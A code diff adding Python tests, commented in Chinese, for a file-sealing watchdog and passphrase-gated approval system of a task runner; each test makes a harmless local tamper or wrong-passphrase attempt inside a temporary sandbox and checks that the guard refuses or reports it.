+            shutil.copy2(REPO / "scripts" / name, scripts / name)
+        rc, out, err = init_and_seal(sb.root, guard=scripts / "ats_guard.py")
+        expect(rc == 0, "封签应成功，实际 %s\n%s\n%s" % (rc, out, err))
+        (scripts / "evil_helper.py").write_text("print('hi')\n", encoding="utf-8")
+        rc, out, err = run_script(scripts / "ats_guard.py", sb.root, "verify")
+        expect(rc == 4, "未封签文件应导致 verify 失败，实际 %s\n%s" % (rc, out))
+        payload = json.loads(out)
+        problems = payload.get("problems") or []
+        expect(any(p.get("file") == "evil_helper.py" and p.get("error") == "unsealed_file"
+                   for p in problems),
+               "应报 evil_helper.py unsealed_file，实际 %r" % (problems,))
+    finally:
+        sb.cleanup()
+
+
+@case
+def guard_self_check_catches_tampered_watchdog():
+    """看门狗自身被改 → ats.py 自检阶段就拦住，不把信任交给它。"""
+    sb = Sandbox()
+    sb.auto_seal = False
+    try:
+        scripts = sb.dir / "scripts"
+        scripts.mkdir(parents=True, exist_ok=True)
+        for name in ("ats.py", "ats_guard.py", "ats_preflight.py", "ats_plan.py"):
+            shutil.copy2(REPO / "scripts" / name, scripts / name)
+        rc, out, err = init_and_seal(sb.root, guard=scripts / "ats_guard.py")
+        expect(rc == 0, "封签应成功，实际 %s\n%s" % (rc, out))
+        with (scripts / "ats_guard.py").open("a", encoding="utf-8") as fh:
+            fh.write("\n# tampered\n")
+        rc, out, err = run_script(scripts / "ats.py", sb.root, "list")
+        expect(rc == 4, "篡改看门狗应返回 EXIT_DENIED，实际 %s\n%s" % (rc, out))
+        payload = json.loads(out)
+        expect((payload.get("detail") or {}).get("stage") == "guard_self_check",
+               "应停在 guard_self_check 阶段，实际 %r" % (payload.get("detail"),))
+    finally:
+        sb.cleanup()
+
+
+@case
+def guard_seal_requires_confirm():
+    """封签会重建信任基线，缺少 --confirm 必须拒绝。"""
+    sb = Sandbox()
+    sb.auto_seal = False
+    try:
+        rc, out, err = sb.guard("seal")
+        expect(rc == 2, "无 --confirm 应返回 EXIT_USAGE，实际 %s\n%s" % (rc, out))
+        payload = json.loads(out)
+        expect(payload.get("error") == "confirm_required",
+               "应报 confirm_required，实际 %r" % payload.get("error"))
+        expect(not sb.manifest.exists(), "被拒绝时不应落盘清单")
+    finally:
+        sb.cleanup()
+
+
+@case
+def skip_guard_requires_l3_approval():
+    """--skip-guard 必须持 L3 审批：先拦、再批准、再放行。"""
+    sb = Sandbox()
+    try:
+        rc, out, err = sb.ats("list", "--skip-guard")
+        expect(rc == 4, "未审批的 --skip-guard 应被拒，实际 %s\n%s" % (rc, out))
+        payload = json.loads(out)
+        expect(payload.get("error") == "guard_skip_approval_required",
+               "应报 guard_skip_approval_required，实际 %r" % payload.get("error"))
+        expect(payload.get("required_level") == "L3",
+               "跳过看门狗应强制 L3，实际 %r" % payload.get("required_level"))
+        approval_id = payload.get("approval_id")
+        expect(approval_id, "应给出审批 id")
+
+        rc, out, err = sb.ats("approve", approval_id)
+        expect(rc == 0, "approve 应成功，实际 %s\n%s" % (rc, out))
+
+        rc, out, err = sb.ats("policy", "--json", "--skip-guard", "--guard-approval", approval_id)
+        expect(rc == 0, "持审批应放行，实际 %s\n%s\n%s" % (rc, out, err))
+        json.loads(out)
+
+        rc, out, err = sb.ats("list", "--skip-guard", "--guard-approval", "no-such-id")
+        expect(rc == 4, "错误审批 id 应被拒，实际 %s\n%s" % (rc, out))
+    finally:
+        sb.cleanup()
+
+
+@case
+def skip_guard_does_not_lower_execution_level():
+    """跳过看门狗不顺带降级：L1 命令也被抬到 L3，且白名单不再自动放行。"""
+    sb = Sandbox()
+    try:
+        rc, out, err = sb.ats("run", "plain", "--skip-guard")
+        payload = json.loads(out)
+        skip_id = payload.get("approval_id")
+        sb.ats("approve", skip_id)
+
+        rc, task = sb.json_out("create", "plain", "--command", "echo hi")
+        expect(task["task"]["level"] == "L1", "普通命令应为 L1")
+
+        rc, out, err = sb.ats("run", "plain", "--skip-guard", "--guard-approval", skip_id)
+        expect(rc == 4, "跳过看门狗后仍应要求审批，实际 %s\n%s" % (rc, out))
+        payload = json.loads(out)
+        expect(payload.get("level") == "L3",
+               "执行等级应被抬到 L3，实际 %r" % payload.get("level"))
+        expect(payload.get("error") == "approval_required",
+               "应要求审批，实际 %r" % payload.get("error"))
+    finally:
+        sb.cleanup()
+
+
+@case
+def guard_detects_policy_tamper_but_allows_policy_set():
+    """直接改 policy.json 会被抓；走 policy --set 则自动重封签，不锁死自己。"""
+    sb = Sandbox()
+    try:
+        rc, out, err = sb.ats("policy", "--set", "max_level", "L2", "--json")
+        expect(rc == 0, "policy --set 应成功，实际 %s\n%s" % (rc, out))
+        payload = json.loads(out)
+        expect(payload.get("max_level") == "L2",
+               "策略应生效，实际 %r" % payload.get("max_level"))
+
+        rc, out, err = sb.ats("list")
+        expect(rc == 0, "改策略后应自动重封签、不再自锁，实际 %s\n%s" % (rc, out))
+
+        sb.auto_seal = False
+        policy_path = sb.root / "policy.json"
+        expect(policy_path.is_file(), "policy --set 应落盘 policy.json")
+        stored = json.loads(policy_path.read_text(encoding="utf-8"))
+        stored["max_level"] = "L0"
+        policy_path.write_text(json.dumps(stored, ensure_ascii=False), encoding="utf-8")
+        rc, out, err = sb.ats("list")
+        expect(rc == 4, "直接改 policy.json 应被拦，实际 %s\n%s" % (rc, out))
+        problems = ((json.loads(out).get("detail") or {}).get("detail") or {}).get("problems") or []
+        expect(any(p.get("file") == "policy.json" and p.get("error") == "digest_mismatch"
+                   for p in problems),
+               "应报 policy.json digest_mismatch，实际 %r" % (problems,))
+    finally:
+        sb.cleanup()
+
+
+HOLD_PROBE = r'''
+import json
+import os
+import sys
+
+sys.dont_write_bytecode = True
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+import ats
+
+root = sys.argv[sys.argv.index("--root") + 1]
+here = os.path.dirname(os.path.abspath(__file__))
+res = {}
+
+denied = ats.guard_handshake(root)
+res["handshake"] = "denied" if denied is not None else "ok"
+if denied is not None:
+    res["payload"] = denied.get("payload")
+    print(json.dumps(res, ensure_ascii=False))
+    raise SystemExit(0)
+
+res["held"] = sorted(os.path.basename(fh.name) for fh in ats.GUARD_HANDLES)
+
+src = os.path.join(here, "ats.py")
+tmp = src + ".probe.tmp"
+with open(tmp, "wb") as fh:
+    fh.write(b"tampered")
+try:
+    os.replace(tmp, src)
+    res["replace"] = "OK"
+except OSError as exc:
+    res["replace"] = type(exc).__name__
+if os.path.exists(tmp):
+    os.remove(tmp)
+
+try:
+    with open(src, "rb") as fh:
+        fh.read()
+    res["read"] = "OK"
+except OSError as exc:
+    res["read"] = type(exc).__name__
+
+res["policy_before"] = ats.policy(root).get("max_level")
+pol_path = os.path.join(root, "policy.json")
+with open(pol_path, encoding="utf-8") as fh:
+    data = json.load(fh)
+data["max_level"] = "L0"
+with open(pol_path, "w", encoding="utf-8") as fh:
+    fh.write(json.dumps(data))
+res["policy_after"] = ats.policy(root).get("max_level")
+print(json.dumps(res, ensure_ascii=False))
+'''
+
+
+@case
+def guard_holds_handles_and_freezes_policy():
+    """持句柄挡住替换但不禁读；policy 走握手快照，运行中原地改写不影响决策。"""
+    sb = Sandbox()
+    sb.auto_seal = False
+    try:
+        scripts = sb.dir / "scripts"
+        scripts.mkdir(parents=True, exist_ok=True)
+        for name in ("ats.py", "ats_guard.py", "ats_preflight.py", "ats_plan.py"):
+            shutil.copy2(REPO / "scripts" / name, scripts / name)
+        probe = scripts / "_probe_hold.py"
+        probe.write_text(HOLD_PROBE, encoding="utf-8")
+        sb.write_policy({"max_level": "L2"})
+        rc, out, err = init_and_seal(sb.root, guard=scripts / "ats_guard.py")
+        expect(rc == 0, "封签应成功，实际 %s\n%s\n%s" % (rc, out, err))
+
+        rc, out, err = run_script(probe, sb.root)
+        expect(rc == 0, "探测脚本应成功，实际 %s\n%s\n%s" % (rc, out, err))
+        payload = json.loads(out)
+        expect(payload.get("handshake") == "ok",
+               "握手应放行，实际 %r" % payload.get("handshake"))
+        expect("ats.py" in payload.get("held", []),
+               "应持有 ats.py 句柄，实际 %r" % payload.get("held"))
+        expect(payload.get("replace") != "OK",
+               "持句柄期间替换 ats.py 必须失败，实际 %r" % payload.get("replace"))
+        expect(payload.get("read") == "OK",
+               "持句柄不应挡住读取，实际 %r" % payload.get("read"))
+        expect(payload.get("policy_after") == payload.get("policy_before"),
+               "运行中原地改 policy.json 不应影响本次决策，%r -> %r"
+               % (payload.get("policy_before"), payload.get("policy_after"))
+               )
+    finally:
+        sb.cleanup()
+
+
+# ---------------------------------------------------------------- 口令闸门
+
+@case
+def guard_init_refuses_rebuild():
+    """密钥只建一次：清单或密钥任一存在时 init 必须拒绝，不给「重置」入口。"""
+    sb = Sandbox()
+    sb.auto_seal = False
+    try:
+        rc, out, err = run_script(GUARD, sb.root, "init", "--confirm",
+                                  passphrase=TEST_PASSPHRASE)
+        expect(rc == 0, "首次 init 应成功，实际 %s\n%s\n%s" % (rc, out, err))
+        expect((sb.root / "ats_guard_key.json").is_file(), "应生成密钥文件")
+
+        rc, out, err = init_and_seal(sb.root)
+        expect(rc == 0, "封签应成功，实际 %s\n%s\n%s" % (rc, out, err))
+
+        rc, out, err = run_script(GUARD, sb.root, "init", "--confirm",
+                                  passphrase="attacker-chosen-passphrase")
+        expect(rc == 4, "清单已存在时 init 应拒绝，实际 %s\n%s" % (rc, out))
+        payload = json.loads(out)
+        expect(payload.get("error") == "already_initialized",
+               "应报 already_initialized，实际 %r" % payload.get("error"))
+
+        rc, out, err = run_script(GUARD, sb.root, "auth",
+                                  passphrase=TEST_PASSPHRASE)
+        expect(rc == 0, "原口令仍应有效，实际 %s\n%s" % (rc, out))
+
+        # 只删清单、留下密钥，曾能用新口令覆盖信任根；密钥不可合法再生，
+        # 因此这里必须仍然拒绝，且拒绝后原口令不受影响。
+        (sb.root / "ats_guard_manifest.json").unlink()
+        rc, out, err = run_script(GUARD, sb.root, "init", "--confirm",
+                                  passphrase="attacker-chosen-passphrase")
+        expect(rc == 4, "只剩密钥文件时 init 也应拒绝，实际 %s\n%s" % (rc, out))
+        payload = json.loads(out)
+        expect(payload.get("error") == "already_initialized",
+               "应报 already_initialized，实际 %r" % payload.get("error"))
+        expect(str(sb.root / "ats_guard_key.json") in (payload.get("existing") or []),
+               "应点出已存在的密钥文件，实际 %r" % payload.get("existing"))
+
+        rc, out, err = run_script(GUARD, sb.root, "auth",
+                                  passphrase=TEST_PASSPHRASE)
+        expect(rc == 0, "拒绝重建后原口令仍应有效，实际 %s\n%s" % (rc, out))
+    finally:
+        sb.cleanup()
+
+
+@case
+def guard_key_loss_points_to_restore():
+    """密钥丢失：verify 报 restore_key；seal 在此场景修不好，ats.py 提示不能指向重封签。"""
+    sb = Sandbox()
+    sb.auto_seal = False
+    try:
+        rc, out, err = init_and_seal(sb.root)
+        expect(rc == 0, "封签应成功，实际 %s\n%s\n%s" % (rc, out, err))
+        (sb.root / "ats_guard_key.json").unlink()
+
+        rc, out, err = run_script(GUARD, sb.root, "verify")
+        expect(rc == 4, "密钥丢失应导致 verify 失败，实际 %s\n%s" % (rc, out))
+        payload = json.loads(out)
+        expect(payload.get("next_action") == "restore_key",
+               "应给出 restore_key，实际 %r" % payload.get("next_action"))
+        expect("git" in (payload.get("hint") or ""),
+               "提示应指向从 git 恢复，实际 %r" % payload.get("hint"))
+
+        # seal 要先口令校验，口令校验要读密钥：这里必然失败，不能作为下一步
+        rc, out, err = run_script(GUARD, sb.root, "seal", "--confirm",
+                                  passphrase=TEST_PASSPHRASE)
+        expect(rc != 0, "密钥丢失时 seal 应失败，实际 %s\n%s" % (rc, out))
+
+        rc, out, err = sb.ats("list")
+        expect(rc == 4, "密钥丢失时命令应被拦，实际 %s\n%s" % (rc, out))
+        payload = json.loads(out)
+        hint = (payload.get("detail") or {}).get("hint") or ""
+        expect("seal 也修不好" in hint, "ats.py 提示应说明 seal 修不好，实际 %r" % hint)
+        expect("恢复" in hint, "ats.py 提示应指向恢复，实际 %r" % hint)
+    finally:
+        sb.cleanup()
+
+
+@case
+def guard_manifest_loss_guides_to_seal():
+    """密钥在、清单丢：verify 指向 seal（init 会 already_initialized 拒绝），seal 能重建基线。"""
+    sb = Sandbox()
+    sb.auto_seal = False
+    try:
+        rc, out, err = init_and_seal(sb.root)
+        expect(rc == 0, "封签应成功，实际 %s\n%s\n%s" % (rc, out, err))
+        (sb.root / "ats_guard_manifest.json").unlink()
+
+        rc, out, err = run_script(GUARD, sb.root, "verify")
+        payload = json.loads(out)
+        expect(payload.get("next_action") == "seal",
+               "密钥仍在时应指向 seal，实际 %r" % payload.get("next_action"))
+
+        rc, out, err = run_script(GUARD, sb.root, "seal", "--confirm",
+                                  passphrase=TEST_PASSPHRASE)
+        expect(rc == 0, "密钥仍在时 seal 应能重建基线，实际 %s\n%s" % (rc, out))
+        rc, out, err = run_script(GUARD, sb.root, "verify")
+        expect(rc == 0, "重建后 verify 应通过，实际 %s\n%s" % (rc, out))
+    finally:
+        sb.cleanup()
+
+
+@case
+def guard_init_requires_confirm_and_length():
+    """init 要 --confirm，且口令有最短长度；两者不满足都不落盘。"""
+    sb = Sandbox()
+    sb.auto_seal = False
+    try:
+        rc, out, err = run_script(GUARD, sb.root, "init",
+                                  passphrase=TEST_PASSPHRASE)
+        expect(rc == 2, "无 --confirm 应返回 EXIT_USAGE，实际 %s\n%s" % (rc, out))
+        expect(json.loads(out).get("error") == "confirm_required",
+               "应报 confirm_required")
+        expect(not (sb.root / "ats_guard_key.json").exists(), "被拒绝时不应落盘密钥")
+
+        rc, out, err = run_script(GUARD, sb.root, "init", "--confirm",
+                                  passphrase="short")
+        expect(rc == 2, "过短口令应返回 EXIT_USAGE，实际 %s\n%s" % (rc, out))
+        expect(json.loads(out).get("error") == "passphrase_too_short",
+               "应报 passphrase_too_short")
+        expect(not (sb.root / "ats_guard_key.json").exists(), "被拒绝时不应落盘密钥")
+    finally:
+        sb.cleanup()
+
+
+@case
+def guard_seal_requires_correct_passphrase():
+    """seal 要口令：缺失与错误都不许重建基线。"""
+    sb = Sandbox()
+    sb.auto_seal = False
+    try:
+        rc, out, err = run_script(GUARD, sb.root, "init", "--confirm",
+                                  passphrase=TEST_PASSPHRASE)
+        expect(rc == 0, "init 应成功，实际 %s\n%s\n%s" % (rc, out, err))
+
+        rc, out, err = run_script(GUARD, sb.root, "seal", "--confirm")
+        expect(rc == 4, "无口令封签应被拒，实际 %s\n%s" % (rc, out))
+        payload = json.loads(out)
+        expect(payload.get("error") == "passphrase_required",
+               "应报 passphrase_required，实际 %r" % payload.get("error"))
+        expect(not sb.manifest.exists(), "被拒绝时不应落盘清单")
+
+        rc, out, err = run_script(GUARD, sb.root, "seal", "--confirm",
+                                  passphrase="wrong-passphrase")
+        expect(rc == 4, "错误口令封签应被拒，实际 %s\n%s" % (rc, out))
+        payload = json.loads(out)
+        expect((payload.get("detail") or {}).get("error") == "passphrase_mismatch",
+               "应报 passphrase_mismatch，实际 %r" % payload.get("detail"))
+        expect(not sb.manifest.exists(), "错误口令不应落盘清单")
+
+        rc, out, err = run_script(GUARD, sb.root, "seal", "--confirm",
+                                  passphrase=TEST_PASSPHRASE)
+        expect(rc == 0, "正确口令封签应成功，实际 %s\n%s" % (rc, out))
+        expect(sb.manifest.is_file(), "应落盘清单")
+    finally:
+        sb.cleanup()
+
+
+@case
+def guard_auth_verifies_without_side_effect():
+    """auth 只校验口令：对错分别给 0 / 4，且不写任何文件。"""
+    sb = Sandbox()
+    sb.auto_seal = False
+    try:
+        rc, out, err = run_script(GUARD, sb.root, "init", "--confirm",
+                                  passphrase=TEST_PASSPHRASE)
+        expect(rc == 0, "init 应成功，实际 %s\n%s\n%s" % (rc, out, err))
+        key_path = sb.root / "ats_guard_key.json"
+        before = key_path.read_bytes()
+
+        rc, out, err = run_script(GUARD, sb.root, "auth", passphrase=TEST_PASSPHRASE)
+        expect(rc == 0, "正确口令应通过，实际 %s\n%s" % (rc, out))
+        expect(json.loads(out).get("ok") is True, "应返回 ok=true")
+
+        rc, out, err = run_script(GUARD, sb.root, "auth", passphrase="nope-nope-nope")
+        expect(rc == 4, "错误口令应被拒，实际 %s\n%s" % (rc, out))
+        expect(json.loads(out).get("error") == "passphrase_mismatch",
+               "应报 passphrase_mismatch")
+
+        rc, out, err = run_script(GUARD, sb.root, "auth")
+        expect(rc == 4, "空口令应被拒，实际 %s\n%s" % (rc, out))
+        expect(json.loads(out).get("error") == "passphrase_missing",
+               "应报 passphrase_missing")
+
+        expect(key_path.read_bytes() == before, "auth 不应改写密钥文件")
+        expect(not sb.manifest.exists(), "auth 不应生成清单")
+    finally:
+        sb.cleanup()
+
+
+@case
+def guard_tracks_key_file_digest():
+    """密钥文件进清单：换掉密钥（换口令）必须被发现。"""
+    sb = Sandbox()
+    sb.auto_seal = False
+    try:
+        rc, out, err = init_and_seal(sb.root)
+        expect(rc == 0, "封签应成功，实际 %s\n%s\n%s" % (rc, out, err))
+        data = json.loads(sb.manifest.read_text(encoding="utf-8"))
+        expect((data.get("key") or {}).get("sha256"), "清单应记录密钥摘要")
+
+        key_path = sb.root / "ats_guard_key.json"
+        record = json.loads(key_path.read_text(encoding="utf-8"))
+        record["hash"] = "0" * 64
+        key_path.write_text(json.dumps(record), encoding="utf-8")
+
+        rc, out, err = run_script(GUARD, sb.root, "verify")
+        expect(rc == 4, "替换密钥应导致 verify 失败，实际 %s\n%s" % (rc, out))
+        problems = json.loads(out).get("problems") or []
+        expect(any(p.get("file") == "ats_guard_key.json"
+                   and p.get("error") == "digest_mismatch" for p in problems),
+               "应报 ats_guard_key.json digest_mismatch，实际 %r" % (problems,))
+
+        rc, out, err = sb.ats("list")
+        expect(rc == 4, "换密钥后 ats.py 启动应被拒，实际 %s\n%s" % (rc, out))
+    finally:
+        sb.cleanup()
+
+
+@case
+def approve_requires_passphrase():
+    """审批入口要口令：缺失/错误都拒，正确才放行。"""
+    sb = Sandbox()
+    try:
+        sb.json_out("create", "gated", "--command", "echo x", "--level", "L0")
+        rc, out, err = sb.ats("delete", "gated")
+        expect(rc == 4, "delete 无审批应退出 4，实际 %s\n%s" % (rc, out))
+        approval_id = json.loads(out).get("approval_id")
+        expect(approval_id, "应生成审批单号")
+
+        rc, out, err = sb.ats("approve", approval_id, passphrase=None)
+        expect(rc == 4, "无口令审批应被拒，实际 %s\n%s" % (rc, out))
+        payload = json.loads(out)
+        expect(payload.get("error") == "passphrase_required",
+               "应报 passphrase_required，实际 %r" % payload.get("error"))
+
+        rc, out, err = sb.ats("approve", approval_id, passphrase="wrong-passphrase")
+        expect(rc == 4, "错误口令审批应被拒，实际 %s\n%s" % (rc, out))
+        payload = json.loads(out)
+        expect((payload.get("detail") or {}).get("error") == "passphrase_mismatch",
+               "应报 passphrase_mismatch，实际 %r" % payload.get("detail"))
+
+        rc, out, err = sb.ats("approve", approval_id)
+        expect(rc == 0, "正确口令应批准成功，实际 %s\n%s" % (rc, out))
+
+        rc, out, err = sb.ats("delete", "gated", "--approval", approval_id)
+        expect(rc == 0, "批准后 delete 应成功，实际 %s\n%s" % (rc, out))
+    finally:
+        sb.cleanup()
+
+
+@case
+def restricted_policy_set_requires_passphrase():
+    """放松型键必须持口令；无害键不受影响。"""
+    sb = Sandbox()
+    try:
+        rc, out, err = sb.ats("policy", "--set", "actor_level", "L0", "--json",
+                              passphrase=None)
+        expect(rc == 4, "无口令改 actor_level 应被拒，实际 %s\n%s" % (rc, out))
+        payload = json.loads(out)
+        expect(payload.get("error") == "passphrase_required",
+               "应报 passphrase_required，实际 %r" % payload.get("error"))
+        expect("actor_level" in (payload.get("restricted") or []),
+               "应把 actor_level 标为 restricted，实际 %r" % payload.get("restricted"))
+
+        rc, out, err = sb.ats("policy", "--json")
+        expect(rc == 0, "策略读取应正常，实际 %s\n%s" % (rc, out))
+        expect(json.loads(out).get("actor_level") == "L3",
+               "被拒的改动不应生效")
+
+        rc, out, err = sb.ats("policy", "--set", "actor_level", "L2", "--json")
+        expect(rc == 0, "持口令应允许改 actor_level，实际 %s\n%s" % (rc, out))
+        expect(json.loads(out).get("actor_level") == "L2", "改动应生效")
+
+        rc, out, err = sb.ats("policy", "--set", "stall_seconds", "120", "--json",
+                              passphrase=None)
+        expect(rc == 4, "任何 --set 都要口令（重封签需要它），实际 %s\n%s" % (rc, out))
+        payload = json.loads(out)
+        expect(payload.get("restricted") == [],
+               "无害键不应被标为 restricted，实际 %r" % payload.get("restricted"))
+
+        rc, out, err = sb.ats("policy", "--set", "stall_seconds", "120", "--json")
+        expect(rc == 0, "持口令应允许改无害键，实际 %s\n%s" % (rc, out))
+        expect(json.loads(out).get("stall_seconds") == 120, "改动应生效")
     finally:
         sb.cleanup()
 
